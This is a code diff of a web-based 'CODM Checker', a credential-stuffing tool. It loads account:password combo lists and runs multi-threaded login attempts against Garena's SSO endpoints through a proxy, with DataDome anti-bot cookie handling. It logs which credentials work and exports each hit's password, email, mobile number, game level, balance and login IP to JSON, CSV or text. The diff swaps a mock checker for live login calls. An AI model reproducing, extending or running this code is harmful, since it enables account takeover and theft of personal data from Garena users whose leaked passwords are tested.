-                    nickname: `Player_${acc.substring(0, 6)}`,
-                    email_display: `${acc}@gmail.com (Not Verified)`,
-                    formatted_mobile: '+62 ****5678',
-                    country: 'Indonesia',
-                    shell_balance: 0,
-                    fb_info: 'NOT CONNECTED',
-                    is_error: false,
-                    last_login_date: new Date().toLocaleString()
-                };
-            } else if (outcome === 2) {
-                return {
-                    account: acc,
-                    password: pwd,
-                    is_valid: true,
-                    is_clean: true,
-                    has_codm: false,
-                    codm_level: 0,
-                    codm_region: 'N/A',
-                    codm_nickname: 'N/A',
-                    uid: `UID_${Date.now()}_${hash}`,
-                    username: `user_${acc}`,
-                    nickname: `Player_${acc.substring(0, 6)}`,
-                    email_display: `${acc}@yahoo.com (Verified)`,
-                    formatted_mobile: '+65 ****9012',
-                    country: 'Singapore',
-                    shell_balance: 500,
-                    fb_info: 'CONNECTED',
-                    is_error: false,
-                    last_login_date: new Date().toLocaleString()
-                };
-            } else if (outcome === 3) {
-                return {
-                    account: acc,
-                    password: pwd,
-                    is_valid: false,
-                    is_error: false,
-                    is_clean: false,
-                    has_codm: false
-                };
+          const pre = await GarenaAPI.prelogin(combo.account);
+          if (!pre.v1 || !pre.v2) {
+            invalid++;
+            UI.log(`INVALID: ${combo.account}`, 'muted');
+          } else {
+            const login = await GarenaAPI.login(combo.account, combo.password, pre.v1, pre.v2);
+            if (login.ssoKey) {
+              valid++;
+              UI.log(`VALID: ${combo.account}:${combo.password}`, 'success');
+              Results.add({ account: combo.account, password: combo.password, is_error: false, result_type: 'valid', has_codm: false, is_clean: false });
             } else {
-                return {
-                    account: acc,
-                    password: pwd,
-                    is_error: true,
-                    error_reason: 'Account Does Not Exist'
-                };
+              invalid++;
+              UI.log(`INVALID: ${combo.account}`, 'error');
             }
+          }
+        } catch(e) {
+          errors++;
+          UI.log(`ERROR: ${combo.account} - ${e.message}`, 'error');
+        } finally {
+          processed++;
+          const pct = (processed / total * 100).toFixed(1);
+          document.getElementById('val-progress').style.width = pct + '%';
+          document.getElementById('val-progress-text').textContent = pct + '%';
+          document.getElementById('val-count').textContent = `${processed} / ${total}`;
+          document.getElementById('val-stats').textContent = `V:${valid} I:${invalid} E:${errors}`;
+          
+          const elapsed = (Date.now() - startTime) / 1000;
+          document.getElementById('speed-display').textContent = (processed / elapsed).toFixed(1);
         }
+      }
+    };
 
-        // Override apiCall to use mock for demo
-        const originalApiCall = apiCall;
-        apiCall = async function(endpoint, data) {
-            if (endpoint === '/api/check') {
-                return await mockApiCheck(data);
-            }
-            return await originalApiCall(endpoint, data);
-        };
+    const workers = [];
+    for (let i = 0; i < threads; i++) workers.push(runWorker());
+    await Promise.all(workers);
 
-        // --- Initial Status ---
-        addLog('info', '🟢 Cyberpunk CODM Checker v3.0 online');
-        addLog('info', '💡 Upload a combo file or enter credentials to start');
+    this.validatorRunning = false;
+    document.getElementById('val-start-btn').disabled = false;
+    document.getElementById('val-stop-btn').disabled = true;
+    UI.setStatus('idle', 'Idle');
+    UI.log(`Validator complete: ${valid} valid, ${invalid} invalid, ${errors} errors`, 'highlight');
+  },
 
-        // Periodic stats update
-        setInterval(updateStats, 1000);
-    </script>
+  stopValidator() {
+    this.validatorRunning = false;
+    UI.log('Stopping validator...', 'warning');
+    document.getElementById('val-stop-btn').disabled = true;
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   STATS — Live statistics tracker
+   ═══════════════════════════════════════════════════════════════ */
+
+const Stats = {
+  valid: 0, invalid: 0, clean: 0, notClean: 0, hasCodm: 0, noCodm: 0, errors: 0,
+  total: 0, startTime: 0,
+  cleanLevels: { '1-100': 0, '101-200': 0, '201-350': 0, '351-400': 0 },
+  ncLevels: { '1-100': 0, '101-200': 0, '201-350': 0, '351-400': 0 },
+
+  reset() {
+    Object.assign(this, {
+      valid: 0, invalid: 0, clean: 0, notClean: 0, hasCodm: 0, noCodm: 0, errors: 0,
+      cleanLevels: { '1-100': 0, '101-200': 0, '201-350': 0, '351-400': 0 },
+      ncLevels: { '1-100': 0, '101-200': 0, '201-350': 0, '351-400': 0 }
+    });
+    this.render();
+  },
+
+  start() { this.startTime = Date.now(); },
+
+  stop() { this.render(); },
+
+  update(data) {
+    if (data.is_error) {
+      this.errors++;
+    } else if (data.result_type === 'valid') {
+      this.valid++;
+    } else {
+      this.valid++;
+      if (data.has_codm) {
+        this.hasCodm++;
+        const lvl = data.codm_level || 0;
+        if (data.is_clean) {
+          this.clean++;
+          if (lvl <= 100) this.cleanLevels['1-100']++;
+          else if (lvl <= 200) this.cleanLevels['101-200']++;
+          else if (lvl <= 350) this.cleanLevels['201-350']++;
+          else this.cleanLevels['351-400']++;
+        } else {
+          this.notClean++;
+          if (lvl <= 100) this.ncLevels['1-100']++;
+          else if (lvl <= 200) this.ncLevels['101-200']++;
+          else if (lvl <= 350) this.ncLevels['201-350']++;
+          else this.ncLevels['351-400']++;
+        }
+      } else {
+        this.noCodm++;
+      }
+    }
+    this.render();
+  },
+
+  render() {
+    const processed = this.valid + this.invalid + this.errors;
+    document.getElementById('stat-valid').textContent = this.valid;
+    document.getElementById('stat-invalid').textContent = this.invalid;
+    document.getElementById('stat-codm').textContent = this.hasCodm;
+    document.getElementById('stat-nocodm').textContent = this.noCodm;
+    document.getElementById('stat-clean').textContent = this.clean;
+    document.getElementById('stat-notclean').textContent = this.notClean;
+    document.getElementById('stat-errors').textContent = this.errors;
+    document.getElementById('stat-processed').textContent = processed;
+
+    document.getElementById('lvl-clean-1').textContent = this.cleanLevels['1-100'];
+    document.getElementById('lvl-clean-2').textContent = this.cleanLevels['101-200'];
+    document.getElementById('lvl-clean-3').textContent = this.cleanLevels['201-350'];
+    document.getElementById('lvl-clean-4').textContent = this.cleanLevels['351-400'];
+    document.getElementById('lvl-nc-1').textContent = this.ncLevels['1-100'];
+    document.getElementById('lvl-nc-2').textContent = this.ncLevels['101-200'];
+    document.getElementById('lvl-nc-3').textContent = this.ncLevels['201-350'];
+    document.getElementById('lvl-nc-4').textContent = this.ncLevels['351-400'];
+
+    const pct = this.total > 0 ? (processed / this.total * 100) : 0;
+    document.getElementById('dash-progress').style.width = pct + '%';
+    document.getElementById('dash-progress-text').textContent = `${processed} / ${this.total}`;
+
+    if (this.startTime && processed > 0) {
+      const elapsed = (Date.now() - this.startTime) / 1000;
+      const rate = processed / elapsed;
+      const remaining = this.total - processed;
+      const eta = rate > 0 ? remaining / rate : 0;
+      document.getElementById('dash-eta').textContent = `ETA: ${Math.floor(eta / 60)}m ${Math.floor(eta % 60)}s`;
+    }
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   RESULTS — Results storage and display
+   ═══════════════════════════════════════════════════════════════ */
+
+const Results = {
+  list: [],
+
+  add(data) {
+    data._timestamp = Date.now();
+    this.list.unshift(data);
+    document.getElementById('results-count').textContent = this.list.length;
+    if (!document.getElementById('view-results').classList.contains('hidden')) {
+      this.render();
+    }
+  },
+
+  render() {
+    const tbody = document.getElementById('results-tbody');
+    const filter = document.getElementById('filter-type').value;
+    const search = document.getElementById('filter-search').value.toLowerCase();
+
+    let filtered = this.list;
+    if (filter !== 'all') {
+      filtered = filtered.filter(r => r.result_type === filter);
+    }
+    if (search) {
+      filtered = filtered.filter(r =>
+        (r.account || '').toLowerCase().includes(search) ||
+        (r.username || '').toLowerCase().includes(search) ||
+        (r.codm_nickname || '').toLowerCase().includes(search)
+      );
+    }
+
+    tbody.innerHTML = filtered.map((r, i) => {
+      const badge = r.is_error
+        ? '<span class="badge error">ERROR</span>'
+        : !r.has_codm
+        ? '<span class="badge nocodm">NO CODM</span>'
+        : r.is_clean
+        ? '<span class="badge clean">CLEAN</span>'
+        : '<span class="badge notclean">NOT CLEAN</span>';
+
+      return `<tr>
+        <td>${i + 1}</td>
+        <td style="font-family:var(--font-mono);font-size:11px">${r.account}:${r.password}</td>
+        <td>${badge}</td>
+        <td>${r.has_codm ? '✓' : '✗'}</td>
+        <td>${r.codm_level || '-'}</td>
+        <td>${r.codm_region || '-'}</td>
+        <td>${r.shell_balance || 0}</td>
+        <td style="font-size:11px">${r.email_display || 'N/A'}</td>
+        <td style="font-size:11px">${r.formatted_mobile || 'N/A'}</td>
+        <td style="font-size:11px">${r.fb_info || 'N/A'}</td>
+      </tr>`;
+    }).join('');
+
+    if (filtered.length === 0) {
+      tbody.innerHTML = '<tr><td colspan="10" style="text-align:center;color:var(--text-muted);padding:20px">No results</td></tr>';
+    }
+  },
+
+  export(format) {
+    if (this.list.length === 0) {
+      UI.log('No results to export', 'warning');
+      return;
+    }
+
+    let content = '';
+    let filename = `codm_results_${Date.now()}`;
+    let mime = 'text/plain';
+
+    if (format === 'json') {
+      content = JSON.stringify(this.list, null, 2);
+      filename += '.json';
+      mime = 'application/json';
+    } else if (format === 'csv') {
+      const headers = ['Account', 'Password', 'Status', 'CODM', 'Level', 'Region', 'Shell', 'Email', 'Mobile', 'FB', 'UID', 'Last Login'];
+      const rows = this.list.map(r => [
+        r.account, r.password,
+        r.is_error ? 'ERROR' : !r.has_codm ? 'NO CODM' : r.is_clean ? 'CLEAN' : 'NOT CLEAN',
+        r.has_codm ? 'Yes' : 'No',
+        r.codm_level || '', r.codm_region || '', r.shell_balance || '',
+        r.email_display || '', r.formatted_mobile || '', r.fb_info || '',
+        r.uid || '', r.last_login_date || ''
+      ]);
+      content = [headers, ...rows].map(r => r.map(c => `"${String(c).replace(/"/g, '""')}"`).join(',')).join('\n');
+      filename += '.csv';
+      mime = 'text/csv';
+    } else {
+      // TXT format — same as Python script
+      content = this.list.map(r => {
+        let out = '='.repeat(60) + '\n';
+        out += `Account: ${r.account} : ${r.password}\n`;
+        if (r.is_error) {
+          out += `Error: ${r.error_reason || 'Unknown'}\n`;
+        } else {
+          out += `UID: ${r.uid || 'N/A'}\n`;
+          out += `Username: ${r.username || 'N/A'}\n`;
+          out += `Garena Shell: ${r.shell_balance || 0}\n`;
+          out += `Email: ${r.email_display || 'N/A'}\n`;
+          out += `Mobile: ${r.formatted_mobile || 'N/A'}\n`;
+          out += `Country: ${r.country || 'N/A'}\n`;
+          out += `Nickname: ${r.nickname || 'N/A'}\n`;
+          out += `\n--- Facebook Information ---\n`;
+          out += `Facebook Username: ${r.fb_username || 'N/A'}\n`;
+          out += `Facebook Link: ${r.fb_link || 'N/A'}\n`;
+          out += `Facebook Status: ${r.fb_info || 'N/A'}\n`;
+          if (r.has_codm) {
+            out += `\n--- CODM Information ---\n`;
+            out += `Account Level: ${r.codm_level || 'N/A'}\n`;
+            out += `Server: ${r.codm_region || 'N/A'}\n`;
+            out += `IGN: ${r.codm_nickname || 'N/A'}\n`;
+            out += `UID: ${r.codm_uid || 'N/A'}\n`;
+          }
+          out += `\n--- Login History ---\n`;
+          out += `Last Login: ${r.last_login_date || 'N/A'}\n`;
+          out += `Last Login From: ${r.last_login_where || 'N/A'}\n`;
+          out += `Last Login IP: ${r.last_login_ip || 'N/A'}\n`;
+          out += `Last Login Country: ${r.last_login_country || 'N/A'}\n`;
+          out += `\nAccount Status: ${r.bind_status || 'N/A'}\n`;
+        }
+        out += `\nPowered by: @nixzlls\n`;
+        out += '='.repeat(60) + '\n\n';
+        return out;
+      }).join('');
+      filename += '.txt';
+    }
+
+    const blob = new Blob([content], { type: mime });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    a.click();
+    URL.revokeObjectURL(url);
+    UI.log(`Exported ${this.list.length} results as ${format.toUpperCase()}`, 'success');
+  },
+
+  clear() {
+    if (this.list.length === 0) return;
+    if (!confirm(`Clear ${this.list.length} results?`)) return;
+    this.list = [];
+    document.getElementById('results-count').textContent = '0';
+    this.render();
+    UI.log('Results cleared', 'info');
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   SETTINGS — Proxy, DataDome configuration
+   ═══════════════════════════════════════════════════════════════ */
+
+const Settings = {
+  save() {
+    const proxy = document.getElementById('settings-proxy').value.trim();
+    HTTPClient.proxyUrl = proxy;
+    localStorage.setItem('nixz_proxy', proxy);
+
+    const dd = document.getElementById('settings-datadome').value.trim();
+    if (dd) {
+      HTTPClient.datadomeOverride = dd;
+      HTTPClient.setCookie('datadome', dd, 'garena');
+      localStorage.setItem('nixz_datadome', dd);
+    }
+
+    document.getElementById('proxy-status-footer').textContent = `Proxy: ${proxy ? 'ON' : 'OFF'}`;
+    UI.renderCookies();
+    UI.log('Settings saved', 'success');
+  },
+
+  async testProxy() {
+    const result = document.getElementById('proxy-test-result');
+    result.innerHTML = '<div class="alert alert-info">Testing...</div>';
+
+    try {
+      const testUrl = 'https://sso.garena.com/api/prelogin?app_id=10100&account=test&format=json&id=1';
+      const { status, json, text } = await HTTPClient.getJson(testUrl, {
+        headers: { 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/133.0.0.0' }
+      });
+
+      if (status === 200 || (json && json.error)) {
+        result.innerHTML = '<div class="alert alert-info">✓ Connection successful! Proxy is working.</div>';
+        UI.log('Proxy test: SUCCESS', 'success');
+      } else if (status === 403) {
+        result.innerHTML = '<div class="alert alert-warning">⚠ Connected but got 403 (DataDome block). Need valid DataDome cookie.</div>';
+        UI.log('Proxy test: 403 Forbidden', 'warning');
+      } else {
+        result.innerHTML = `<div class="alert alert-error">✗ Got status ${status}. Proxy may not support cookies/headers.</div>`;
+        UI.log(`Proxy test: status ${status}`, 'error');
+      }
+    } catch(e) {
+      result.innerHTML = `<div class="alert alert-error">✗ Error: ${e.message}. Check proxy URL.</div>`;
+      UI.log(`Proxy test error: ${e.message}`, 'error');
+    }
+  },
+
+  async fetchDatadome() {
+    const result = document.getElementById('datadome-result');
+    result.innerHTML = '<div class="alert alert-info">Fetching...</div>';
+    const dd = await GarenaAPI.fetchDatadome();
+    if (dd) {
+      document.getElementById('settings-datadome').value = dd;
+      HTTPClient.datadomeOverride = dd;
+      localStorage.setItem('nixz_datadome', dd);
+      result.innerHTML = `<div class="alert alert-info">✓ DataDome cookie: ${dd.substring(0, 40)}...</div>`;
+      UI.renderCookies();
+    } else {
+      result.innerHTML = '<div class="alert alert-error">✗ Failed to fetch DataDome cookie. Check proxy settings.</div>';
+    }
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   UI — Terminal log, status, rendering
+   ═══════════════════════════════════════════════════════════════ */
+
+const UI = {
+  logBuffer: [],
+  maxLogLines: 500,
+
+  log(message, type = 'info') {
+    const ts = new Date().toLocaleTimeString('en-US', { hour12: false });
+    const line = document.createElement('div');
+    line.className = `terminal-line ${type}`;
+    line.innerHTML = `<span class="ts">[${ts}]</span> ${message}`;
+    const terminal = document.getElementById('terminal');
+    terminal.appendChild(line);
+    terminal.scrollTop = terminal.scrollHeight;
+
+    this.logBuffer.push({ ts, message, type });
+    if (terminal.children.length > this.maxLogLines) {
+      terminal.removeChild(terminal.firstChild);
+    }
+  },
+
+  logResult(data) {
+    if (data.is_error) {
+      this.log(`✗ ${data.account} — ${data.error_reason}`, 'error');
+    } else if (!data.has_codm) {
+      this.log(`○ ${data.account} — NO CODM | ${data.bind_status}`, 'warning');
+    } else if (data.is_clean) {
+      this.log(`✔ ${data.account} — CLEAN | Lv${data.codm_level} | ${data.codm_nickname} | ${data.codm_region}`, 'success');
+    } else {
+      this.log(`● ${data.account} — NOT CLEAN | Lv${data.codm_level} | ${data.codm_nickname}`, 'warning');
+    }
+  },
+
+  setStatus(state, text) {
+    const dot = document.getElementById('status-dot');
+    const txt = document.getElementById('status-text');
+    dot.className = `status-dot ${state}`;
+    txt.textContent = text;
+  },
+
+  resetStats() {
+    Stats.reset();
+    this.log('Stats reset', 'info');
+  },
+
+  renderCookies() {
+    const panel = document.getElementById('cookie-panel');
+    const allCookies = [];
+    for (const domain of Object.values(HTTPClient.cookies)) {
+      for (const [name, value] of Object.entries(domain)) {
+        allCookies.push({ name, value });
+      }
+    }
+    if (allCookies.length === 0) {
+      panel.innerHTML = '<div class="cookie-item"><span class="ck-name">No cookies set</span></div>';
+    } else {
+      panel.innerHTML = allCookies.map(c =>
+        `<div class="cookie-item"><span class="ck-name">${c.name}</span><span class="ck-value" title="${c.value}">${c.value}</span></div>`
+      ).join('');
+    }
+  },
+
+  renderSingleResult(data) {
+    const area = document.getElementById('single-result-area');
+
+    if (data.is_error) {
+      area.innerHTML = `<div class="card">
+        <div class="card-header"><div class="card-title" style="color:var(--error)">✗ INVALID</div></div>
+        <div class="result-detail">
+          <div class="detail-grid">
+            <div class="detail-item"><span class="detail-label">Login:</span><span class="detail-value">${data.account}:${data.password}</span></div>
+            <div class="detail-item"><span class="detail-label">Reason:</span><span class="detail-value" style="color:var(--error)">${data.error_reason}</span></div>
+          </div>
+        </div>
+      </div>`;
+      return;
+    }
+
+    const statusColor = data.is_clean ? 'var(--success)' : data.has_codm ? 'var(--warning)' : 'var(--error)';
+    const statusText = data.is_clean ? '✔ CLEAN' : data.has_codm ? '● NOT CLEAN' : '○ NO CODM';
+
+    area.innerHTML = `<div class="card">
+      <div class="card-header"><div class="card-title" style="color:${statusColor}">${statusText}</div></div>
+      <div class="result-detail">
+        <div class="detail-grid">
+          <div class="detail-item"><span class="detail-label">Login:</span><span class="detail-value">${data.account}:${data.password}</span></div>
+          <div class="detail-item"><span class="detail-label">UID:</span><span class="detail-value">${data.uid}</span></div>
+          <div class="detail-item"><span class="detail-label">Username:</span><span class="detail-value">${data.username}</span></div>
+          <div class="detail-item"><span class="detail-label">Shell:</span><span class="detail-value">${data.shell_balance}</span></div>
+          <div class="detail-item"><span class="detail-label">Email:</span><span class="detail-value">${data.email_display}</span></div>
+          <div class="detail-item"><span class="detail-label">Mobile:</span><span class="detail-value">${data.formatted_mobile}</span></div>
+          <div class="detail-item"><span class="detail-label">Country:</span><span class="detail-value">${data.country}</span></div>
+          <div class="detail-item"><span class="detail-label">Facebook:</span><span class="detail-value">${data.fb_info}</span></div>
+          ${data.fb_link !== 'N/A' ? `<div class="detail-item"><span class="detail-label">FB Link:</span><span class="detail-value"><a href="${data.fb_link}" target="_blank" style="color:var(--primary)">${data.fb_link}</a></span></div>` : ''}
+          ${data.has_codm ? `
+          <div class="detail-item"><span class="detail-label">CODM Level:</span><span class="detail-value" style="color:var(--primary)">${data.codm_level}</span></div>
+          <div class="detail-item"><span class="detail-label">CODM IGN:</span><span class="detail-value">${data.codm_nickname}</span></div>
+          <div class="detail-item"><span class="detail-label">CODM UID:</span><span class="detail-value">${data.codm_uid}</span></div>
+          <div class="detail-item"><span class="detail-label">Server:</span><span class="detail-value">${data.codm_region}</span></div>
+          ` : '<div class="detail-item"><span class="detail-label">CODM:</span><span class="detail-value" style="color:var(--error)">NO CODM ACCOUNT</span></div>'}
+          <div class="detail-item"><span class="detail-label">Last Login:</span><span class="detail-value">${data.last_login_date}</span></div>
+          <div class="detail-item"><span class="detail-label">Login From:</span><span class="detail-value">${data.last_login_where}</span></div>
+          <div class="detail-item"><span class="detail-label">Login IP:</span><span class="detail-value">${data.last_login_ip}</span></div>
+          <div class="detail-item"><span class="detail-label">Status:</span><span class="detail-value" style="color:${statusColor}">${data.bind_status}</span></div>
+        </div>
+      </div>
+    </div>`;
+  },
+
+  switchView(view) {
+    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+    document.querySelector(`[data-view="${view}"]`).classList.add('active');
+    document.querySelectorAll('.content').forEach(c => c.classList.add('hidden'));
+    document.getElementById(`view-${view}`).classList.remove('hidden');
+    document.getElementById('topbar-title').textContent =
+      view.charAt(0).toUpperCase() + view.slice(1);
+    if (view === 'results') Results.render();
+    if (view === 'settings') this.renderCookies();
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   EVENT LISTENERS & INITIALIZATION
+   ═══════════════════════════════════════════════════════════════ */
+
+// Navigation
+document.querySelectorAll('.nav-item').forEach(item => {
+  item.addEventListener('click', () => UI.switchView(item.dataset.view));
+});
+
+// Bulk tabs
+document.querySelectorAll('[data-bulk-tab]').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('[data-bulk-tab]').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    const target = tab.dataset.bulkTab;
+    document.getElementById('bulk-tab-paste').style.display = target === 'paste' ? '' : 'none';
+    document.getElementById('bulk-tab-upload').style.display = target === 'upload' ? '' : 'none';
+  });
+});
+
+// Validator tabs
+document.querySelectorAll('[data-val-tab]').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('[data-val-tab]').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    const target = tab.dataset.valTab;
+    document.getElementById('val-tab-paste').style.display = target === 'paste' ? '' : 'none';
+    document.getElementById('val-tab-upload').style.display = target === 'upload' ? '' : 'none';
+  });
+});
+
+// File upload — Bulk
+const fileDrop = document.getElementById('file-drop');
+const fileInput = document.getElementById('file-input');
+
+fileInput.addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if (file) handleFile(file, 'file-info');
+});
+
+fileDrop.addEventListener('dragover', (e) => { e.preventDefault(); fileDrop.classList.add('dragover'); });
+fileDrop.addEventListener('dragleave', () => fileDrop.classList.remove('dragover'));
+fileDrop.addEventListener('drop', (e) => {
+  e.preventDefault();
+  fileDrop.classList.remove('dragover');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file, 'file-info');
+});
+
+// File upload — Validator
+const valFileDrop = document.getElementById('val-file-drop');
+const valFileInput = document.getElementById('val-file-input');
+
+valFileInput.addEventListener('change', (e) => {
+  const file = e.target.files[0];
+  if (file) handleFile(file, 'val-file-info');
+});
+
+valFileDrop.addEventListener('dragover', (e) => { e.preventDefault(); valFileDrop.classList.add('dragover'); });
+valFileDrop.addEventListener('dragleave', () => valFileDrop.classList.remove('dragover'));
+valFileDrop.addEventListener('drop', (e) => {
+  e.preventDefault();
+  valFileDrop.classList.remove('dragover');
+  const file = e.dataTransfer.files[0];
+  if (file) handleFile(file, 'val-file-info');
+});
+
+function handleFile(file, infoId) {
+  const reader = new FileReader();
+  reader.onload = (e) => {
+    const content = e.target.result;
+    const lines = content.split('\n').filter(l => l.trim() && l.includes(':'));
+    document.getElementById(infoId).textContent = `${file.name} — ${lines.length} accounts loaded`;
+    document.getElementById(infoId).dataset.content = content;
+  };
+  reader.readAsText(file);
+}
+
+// Enter key on single check
+document.getElementById('single-password').addEventListener('keypress', (e) => {
+  if (e.key === 'Enter') Checker.singleCheck();
+});
+
+// Initialize
+HTTPClient.init();
+UI.log('NIXZ CODM Checker — Web Edition initialized', 'highlight');
+UI.log('Configure CORS proxy in Settings before checking accounts', 'warning');
+UI.log('Owner: @nixzlls | Telegram: @nixzllss', 'muted');
+Stats.render();
+</script>
 </body>
 </html>
